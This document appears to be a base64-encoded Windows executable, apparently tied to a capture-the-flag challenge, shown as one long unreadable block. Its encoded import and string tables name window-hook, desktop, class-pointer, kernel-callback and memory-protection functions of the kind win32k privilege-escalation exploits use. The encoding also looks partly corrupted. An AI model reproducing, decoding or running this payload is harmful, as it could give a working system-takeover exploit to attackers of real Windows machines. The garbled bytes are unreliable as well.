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RIA0oEIUg7AXQvSUlASD0BICB3IErOqQIgIEFBAUkESM6JLAIgIDABICBJx4M/fkhASQhIICAgD3dIXCRQSGwkWEh0JEggQV9BXkFdQV9IJAhIdCQQV0gwSAEgIEUzSUgBICBNTDkCdD1MSEwkIEhNEklICg8QQA9/RCQgNiAgIA9MJChBPQEgIHYgTDt1BERZSCRASHQkSEljSDBfzIM9MQ4gICBMTH0DM8ODenwgASAgIHQvICAgMzNRCFQkGEwkGjJMJBkyQVEIOEwkG0EgICAPQTFJDEglEiAgSCQISGwkEEh0JBhXSCBIASAgECAgIEw7SUhISA9CTMONUBU4ESAgSEh0LEzDukEgICBICiAgREhIAgEgIEwzSBUQICBIJDBIbCQ4SHQkQEggX0hIMzlQAiAgdSxQAUQkMCAgIFACICBFM0gBICBFM0QkKEQkIBUGEiAgSEhIJAhXSCBIASAgIEjHgVQCICABICAgdU9IASAgSHhISHQ/SCsBICBMBUgPFREgIEgBICBMBRURICBIIEgBICBIASAgSCQwSCBfSCV4ESAgSDhBQEhUJChIVCQgRCQgREQkJEhIOMyLCiAgIHwPICAgGVAQD03DuCAgIMyLFQwgIEgkCFdIID0MICAgSA8gICABICAgCgwgIEgPICAgSHkCICAISAIgIAhIYQIgIEhpAiAgSAFISHECICBIICAgICAPICAgSAEgIEhUJEAVCiAgdTlITCRAFVsKICBICnQKICBISAkVSAogIEhMJEBITCABICBITCRAFTUKICBIRCRASHABICBIAiAgSFQkSEgIAiAgSGQkSCBIAiAgFQogIEh0DkUzM0gVCiAgSCQwSCBfQFNIIEhI0blIGQ5ISAUKICA1SEgFCiAgdMmsSkhIBQogIEFISAUKICB7JzNISAUKICAexIpIBWMKICAzSDkFagogIA9IIFtIRTNIAUhIO3QTSUgISSAGICByM0wBASAgIEgkEEhsJBhIdCQgV0FWQVdIMEwzMwEgIA9mASAgFS4KICBIyLogICAVCiAgM0gKICAIICAgQSkgIBVODyAgSEgPHgEgIEUzMzMVCiAgSAEgIExEJFBJIEgBICBIASAgTEhEJChMBTNEJCAEICAgMxUMICBISA8gICAPICAgSBVICiAgASAgIEgVEgogIEghbCQoSEwkUEUzRCQgICAgRTMzFUoOICBMSHR+SEgwAiAgFRIKICA6ICBIFQwgIHQWM0gVCiAgZCAgIBUMICBICiAgTDMVaA4gIEkVCiAgOS1tCSAgdR4DICAVXAwgIMaDAg85LU8JICB0BQEgICBIdAlIFQwgIAoQCSAgFQogIEgKI0g5IHQFAiAgSBUIICBJTwhIJFhIbCRISlhIdCRoSDBBX0FeX0hIWBBIcBhIeCBVQVZBV0hoSAMgIDMVTgogIEgFCCAgZUgEJSAgIEgFTwggIBUhDCAgBXsIICAPCAIgIA8BICBMBCAgPSAgIAp0BQMgIAIgIA8BICA9ICAgFgU4CCAgASAgIA8BICAzSEQkQEhEJEhEJFBISA8BICBED0guSEwkQEwDSEhAODl1RTNDRAEwQgQBSXVMehhIFQogIAQBICBITCREM1kEICBITCQVRAogIA9CASAgSEwkSEhAODl1DwVmAUhMJEhIQDg5dUxEJEAzQQQQBBFIwoR1AyAgIEh8JDBBICAgfCQoRTPJiSQgQUhMJERDFSAgIEhIdURIVXBITCRADyAgIEh8JDBEQ3wkKEhNcEUzyYlcJCBBFXggICBISA8gICAzSBUgICDQuUAgICAVCSAgTAIgIEh8JCBIREhMFQogICB0TUgVXiAgIEQCICBIFVBFM0QkIBMgICBJYUgTdB1JK0lISQNIBUcGICABICAgTCQDICBJWyhJczBJezhJQV9BXl1IXCQQSGwkGFZXQVZIIEgFBSAgSB1EM2wkQExwWENmdR9IYwUFICBIayBIEEgFSAMPBFAIICAgSTRMTCRASERCFTYJICB0LEgDTEwkQEhIEEgWCCAgIEREJEAVEQkgIEgYBnJIXCRISGwkUEggQV5fXkhcJBBIbCQYVldBVkggSAU7BSAgSB0zbCRATHBYQ2Z1H0hjBQQgIEhrIEgQSAVIAw8EUEgKSTRIBkxMJEAIICAgSAFIREIVdQggIHQsSENMTCRASAYIICAgREQkQEgVUgggIEgYBnICSFwkSEhsJFBIIEFeX15IXCQYSHwkIFVISDAz24ldEHxFGEhNZkUcM0UeSHRqSCAQICBEJCAgICAgQSAgDyBIVRhFM0lISHRBTE0QSMiNUyBEQ0AVICAgdClITE0QIFMgZkcESM+IRwZERRAVICAgSHwkWEhcJFBIMF1IKBUGICAzSAU5BCAgFQYgIEhjFXwDICBMBUhrGkgFAyAgQg8EAQUXBCAgQg9EAQIFAyAgQg9EASAFAyAgQg9EAQQFAyAgQg9EAQYFAyAgQg9EAQgFAyAgEHwQBQMgIAVYAyAgDgVQAyAgBUgDICBIClhIKCUyCCAgAQQBIARCICABDwYgD2QgIA80BiAPMgpwAQoEIAo0BiAKMgZwARQIIBRkCCAUVCAgFDQGIBQyEHABFwkgF2QgF1QgFzQgFwEgEHAgIAEMBCAMNAogDHIIcAEKBCAKNAYgCjIGcAEGAiAGUgIwAQYCIAYyAjABGQggGWQIIBlUICAZNAYgGTIVcAEbCSAbdCwgG2QgGzQgGwEoIBBQICABHAogHDQ0IBwBIBAODAoIcCAGUCAgASAEICA0EiAgBnABGSAgGXQJIBlkCCAZVCAgGTQGIBkyFQEWICAWVBcgFjQWIBYSEA4McAEZCiAZdBEgGWQQIBlUDyAZNA4gGRUBFAogFDQSIBQQDgwKCHAgBlABFwggF2QUIBdUEyAXNBIgFxBwARwMIBxkDCAcVAogHDQgIBwyGBYUEhBwARAGIBBkCCAQNCAgEDIMcAESICASZCkgEjQoIBIBJiAKcCAgAQQBIARCICABIAQgIDQGICAyBnABBAEgBEIgIAEhCiAhNCAgIQEWIBoYFhQScBEQUCAgARkKIBl0CSAZZAggGVQgIBk0BiAZMhUBHAwgHGQMIBxUCiAcNAogHDIYFhQSEHABDwYgD2QJIA80CCAPUgpwARQIIBRkCCAUVCAgFDQGIBQyEHABBAEgBCAgAQoEIAo0BiAKMgZwAQQBIARiICABCgQgCjQGIAoyBnABBgIgBjICMAEYCiAYZAogGFQMIBg0CiAYUhQSEHABIgogInR3ICJkdiAiNHUgIgFwIBQSEFAgIAESCCASVAogEjQJIBIyDgxwCgESCCASVCAgEjQJIBIyDgxwARIGIBJ0CiASNAogElIKUAEEASAEQiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwECAgWBAgICA8ICBgECAgECAgCDwgIBAgICURICAYPCAgLBEgIBEgICQ8ICARICASICA4PCAgEiAgChMgIFA8ICA0EyAgEyAgXDwgIBMgIBMgIGg8ICATICAUICBwPCAgNBQgIBQgIHg8ICAUICAXICA8ICAXICAgHSAgPCAgKB0gIAMeICA8ICAMHiAgHyAgPCAgHyAgIiAgPCAgIiAgIyAgPCAgIyAgJSAgFD0gIFAmICBsJyAgLD0gIHQnICApICBAPSAgKSAgICA9ICAgIAogIGw9ICAgIAogID0gICAgPiwgID0gIEQsICAsICA9ICAsICBsLiAgPSAgdC4gID4vICA9ICBELyAgJDAgID0gICwwICAwICA9ICAUMSAgMSAgPSAgMSAgMSAgED4gIDEgIHAyICAYPiAgeDIgIDIgICQ+ICAyICAzICAsPiAgMyAgfzQgIDg+ICA0ICA2ICBAPiAgNiAgFTkgIFg+ICAcOSAgOSAgdD4gIDkgIDogID4gIDogIEY7ICA+ICBMOyAgOyAgPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJICAgICAgIEogICAgICAOSiAgICAgIEcgICAgICACSCAgICAgIBhIICAgICAgLEggICAgICA8SCAgICAgIEpIICAgICAgWEggICAgICBoSCAgICAgIHRIICAgICAgSCAgICAgIEggICAgICBIICAgICAgSCAgICAgIEggICAgICBIICAgICAgSCAgICAgIEggICAgICBIICAgICAgCEkgICAgICAgSSAgICAgICxJICAgICAgOkkgICAgICBMSSAgICAgIEkgICAgICB0SSAgICAgIEkgICAgICBJICAgICAgSSAgICAgIEkgICAgICBJICAgICAgSSAgICAgIEkgICAgICAgSiAgICAgICAgICAgICAgLE0gICAgICAaTSAgICAgICAgICAgICAgOEogICAgICBKSiAgICAgIGpKICAgICAgfEogICAgICBKICAgICAgSiAgICAgIEogICAgICBKICAgICAgSiAgICAgIEogICAgICBKICAgICAgSiAgICAgIA5LICAgICAgHksgICAgICAsSyAgICAgIEBLICAgICAgUEsgICAgICBkSyAgICAgIHRLICAgICAgSyAgICAgIEsgICAgICBLICAgICAgSyAgICAgIEsgICAgICBLICAgICAgSyAgICAgIFxKICAgICAgICAgICAgICBHICAgICAgRyAgICAgIEhNICAgICAgICAgICAgICB2TCAgICAgIEwgICAgICBMICAgICAgTCAgICAgIEwgICAgICBMICAgICAgTCAgICAgICBNICAgICAgPkwgICAgICAiTCAgICAgICBMICAgICAgVkwgICAgICAgICAgICAgIEBHICAgICAgICAgIEcgICBEICAgRSAgICAgICAgICAqSiAgIEIgIEYgICAgICAgICAgSyAgQEMgIEcgICAgICAgICAgEE0gIEBEICBIRiAgICAgICAgICA8TSAgKEMgICAgICAgICAgICAgICAgICAgICAgSSAgICAgICBKICAgICAgDkogICAgICBHICAgICAgAkggICAgICAYSCAgICAgICxIICAgICAgPEggICAgICBKSCAgICAgIFhIICAgICAgaEggICAgICB0SCAgICAgIEggICAgICBIICAgICAgSCAgICAgIEggICAgICBIICAgICAgSCAgICAgIEggICAgICBIICAgICAgSCAgICAgIAhJICAgICAgIEkgICAgICAsSSAgICAgIDpJICAgICAgTEkgICAgICBJICAgICAgdEkgICAgICBJICAgICAgSSAgICAgIEkgICAgICBJICAgICAgSSAgICAgIEkgICAgICBJICAgICAgIEogICAgICAgICAgICAgICxNICAgICAgGk0gICAgICAgICAgICAgIDhKICAgICAgSkogICAgICBqSiAgICAgIHxKICAgICAgSiAgICAgIEogICAgICBKICAgICAgSiAgICAgIEogICAgICBKICAgICAgSiAgICAgIEogICAgICAOSyAgICAgIB5LICAgICAgLEsgICAgICBASyAgICAgIFBLICAgICAgZEsgICAgICB0SyAgICAgIEsgICAgICBLICAgICAgSyAgICAgIEsgICAgICBLICAgICAgSyAgICAgIEsgICAgICBcSiAgICAgICAgICAgICAgRyAgICAgIEcgICAgICBITSAgICAgICAgICAgICAgdkwgICAgICBMICAgICAgTCAgICAgIEwgICAgICBMICAgICAgTCAgICAgIEwgICAgICAgTSAgICAgID5MICAgICAgIkwgICAgICAKTCAgICAgIFZMICAgICAgICAgICAgICACX3Nud3ByaW50ZiAgAl9zdHJpY21wICBtc3ZjcnQuZGxsICABR2V0Q3VycmVudFByb2Nlc3MgdwJHZXRTeXN0ZW1EaXJlY3RvcnlXIBsCR2V0TW9kdWxlSGFuZGxlQSAgPgNMb2FkTGlicmFyeUEgIAJHbG9iYWxBbGxvYyACR2xvYmFsRnJlZSAgegJHZXRTeXN0ZW1JbmZvIHUgQ29weUZpbGVXIBADSXNXb3c2NFByb2Nlc3MgIARUbHNTZXRWYWx1ZSACSGVhcEZyZWUgIAgFV2FpdEZvclNpbmdsZU9iamVjdCABR2V0Q3VycmVudFRocmVhZElkICAEU2xlZXAgAkhlYXBBbGxvYyAEU2xlZXBFeCAEVGxzR2V0VmFsdWUgIENyZWF0ZUV2ZW50QSAgBFNldFRocmVhZEFmZmluaXR5TWFzayADUmVhZEZpbGUgIAJIZWFwQ3JlYXRlICAEVmlydHVhbFByb3RlY3QgIARTZXRQcmlvcml0eUNsYXNzICAEU2V0VGhyZWFkUHJpb3JpdHkgIENyZWF0ZUZpbGVXIBYEUmVzdW1lVGhyZWFkICAgQ3JlYXRlRmlsZUEgdgJHZXRTeXN0ZW1EaXJlY3RvcnlBIARUZXJtaW5hdGVUaHJlYWQgBFRsc0FsbG9jICAgRGVsZXRlRmlsZVcgUiBDbG9zZUhhbmRsZSAgQ3JlYXRlVGhyZWFkICABR2V0RmlsZVNpemUgUQJHZXRQcm9jZXNzSGVhcCAgBFRsc0ZyZWUgS0VSTkVMMzIuZGxsICAKA1VuaG9va1dpbkV2ZW50ICACU2V0V2luRXZlbnRIb29rIGogQ3JlYXRlTWVudSAgPgJQb3N0UXVpdE1lc3NhZ2UgCSBBcHBlbmRNZW51QSACU2V0Q2xhc3NMb25nQSACU2V0UGFyZW50IH8CU2VuZE1lc3NhZ2VBICAJA1RyYW5zbGF0ZU1lc3NhZ2UgIG0gQ3JlYXRlV2luZG93RXhBICBEZXN0cm95TWVudSAgRGVmV2luZG93UHJvY0EgIFMCUmVnaXN0ZXJDbGFzc0EgIA8BR2V0Q2xhc3NMb25nQSACU2hvd1dpbmRvdyAgAlNldFRocmVhZERlc2t0b3AgIBMBR2V0Q2xhc3NOYW1lQSACU2V0Q2xhc3NMb25nUHRyVyAgPAJQb3N0TWVzc2FnZUEgIAJTZXRXaW5kb3dMb25nUHRyVyACU2V0QWN0aXZlV2luZG93IAJTZXRXaW5kb3dQb3MgICBEZXN0cm95V2luZG93ICBEaXNwYXRjaE1lc3NhZ2VBICBcAUdldE1lc3NhZ2VBIFsgQ3JlYXRlRGVza3RvcEEgIEogQ2xvc2VEZXNrdG9wICBVU0VSMzIuZGxsICADUnRsSW1hZ2VSdmFUb1NlY3Rpb24gIAFOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gIANSdGxJbml0VW5pY29kZVN0cmluZyAgMQRSdGxRdWVyeUVudmlyb25tZW50VmFyaWFibGVfVSADUnRsSW1hZ2VOdEhlYWRlciAgA1J0bEdldFZlcnNpb24gYgJSdGxBbGxvY2F0ZUFjdGl2YXRpb25Db250ZXh0U3RhY2sgIE50Q2FsbGJhY2tSZXR1cm4gIGUCUnRsQWxsb2NhdGVIZWFwICACTnRTZXRUaW1lciAgSgNSdGxGcmVlSGVhcCAgTnRDcmVhdGVUaW1lciBudGRsbC5kbGwgAVJwY1N0cmluZ0ZyZWVBICBHcmVhdC1Kb2IuVGhpcy1pcy10aGUtY29ycmVjdC11cmwuY2hhbGxhbmdlLmNvbSAgCgJVdWlkVG9TdHJpbmdBIFJQQ1JUNC5kbGwgIARtZW1zZXQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkICAgeMil2KUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgAiAgIApsQCBIQCADICAgA21AIEAgICAgIG5rQCBMQCAoICAgRWtAIERAICAgCiBqQCA8QCAgIAwgakAgaEAgZyBkIGkgMyAyIC4gZCBsIGwgICBhIGQgdiBhIHAgaSAzIDIgLiBkIGwgbCAgICAgbSBzIHYgYyByIHQgLiBkIGwgbCAgICAgciBwIGMgciB0IDQgLiBkIGwgbCAgICAgayBlIHIgbiBlIGwgMyAyIC4gZCBsIGwgICAgIGsgZSByIG4gZSBsIGIgYSBzIGUgLiBkIGwgbCAgICAgdSBzIGUgciAzIDIgLiBkIGwgbCAgICAgU1RBVElDICAgICAgICAgICAgICBHbG9iYWxcICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVU1ZXDgUgICBfXltoMyAgQVVMZUgEJTAgICBICEBIIEh9CEUQSEgzSARyIEhIBEgEICAgIEhIdExVFEkCSEhIdE5JCEkCSEhIdDxJCEkCTEhIdCpJCEkCTEkgICAgSEh0EUkISQJKBBxJCElBXSBzeXNzaGFkb3cgICBtc2N0ZmltZSB1aSBTQ1JPTExCQVIgICBcIEIgYSBzIGUgTiBhIG0gZSBkIE8gYiBqIGUgYyB0IHMgXCAlIFMgICAgICogZCBQICAgOCBsICAgKiBkIFAgICA4IGwgICAqIGQgUCAgIDggbCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAyIGwgVCAoIEAgbCAgIDIgbCBYICggQCB4ICggICAgICAgHxJDEV0RETISLyB4ASAgKCBEIAFCIFAgHxJDEV0RETISMCB4ASAgKCBEIAFCIFAgHxJDEV0RETISMCB4ASAgKCBEIAFCIFAgHxJDEV0RETISMCB4ASAgKCBEIAFCIFAgGxJCEVwRES4SMCB4ASAgKCBEIAFCIFAgGxJCEVwRES4SMCB4ASAgKCA4IAFCIFAgGxJCEVwRES4SMCB4ASAgKCA4IAFCIFAgNRJNEWgREUoSMSAgIHggSCAEAkIgUCA1Ek0RaBERShIxICAgeCBIIAQCQiBQIDUSTRFoERFKEjIgICB4IEggBAJCIFAgNRJNEWgREUoSMSAgIHggSCAEAkIgUCA1Ek0RaBERShIxICAgeCBIIAQCQiBQIDUSTRFoERFKEjIgICB4IEggBAJCIFAgQRJOEW0REVYSMiAgIHggUCAkAkEgTiBBEk4RbRERVhIyICAgeCBQICQCQSBOICAgICAgICAgICAgICAgICAgICAgICAgICAgNxJdET0RChIeEjQgICB0ICAMAkMgUCAgICAgICAgICAgICAgICAgICAgICAgICAgIDoSXxE/EQ4SIRI2ICAgdCAgXANHIFQgICAgICAgICAgICAgICAgICAgICAgICAgICA9EhFAERASJBI4ICAgdCAgbANKIFcgPxJiEUIREhImEjggICB0ICBsA0ogVyBDEmMRQxEVEikSOiAgIHQgIGwDSyBYICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICACEiERIBERET8gICB0ICB0A0sgWCAgEiIRARERETwgICB0ICB0A0sgWCAgICAgICA5BiRcICAgIAogICAgICBMICBMICBHQ1RMIAIgIFkgIC5kYXRhICAgWyAgXAQgIC5yZGF0YS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